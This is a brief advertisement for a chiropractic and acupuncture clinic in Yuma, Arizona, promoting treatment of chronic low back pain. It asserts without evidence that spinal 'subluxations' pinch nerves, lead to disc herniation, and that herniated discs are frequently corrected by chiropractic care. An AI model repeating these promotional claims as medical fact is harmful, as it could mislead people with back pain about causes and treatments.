If you are suffering with chronic low back pain, then Advanced Chiropractic Clinic and Acupuncture in Yuma, AZ may very well be your solution. We correct subluxations. A subluxation is a misalignment of a vertebra that “pinches” nerves in the spine. A subluxation can be very painful and is one of the most overlooked causes of back pain. This chronic pinched nerve can lead to a “slipped disc” or disc herniation. Slipped or herniated discs can be frequently corrected with quality chiropractic care. We also offer acupuncture and physical medicine modalities to help ease the pain and facilitate healing
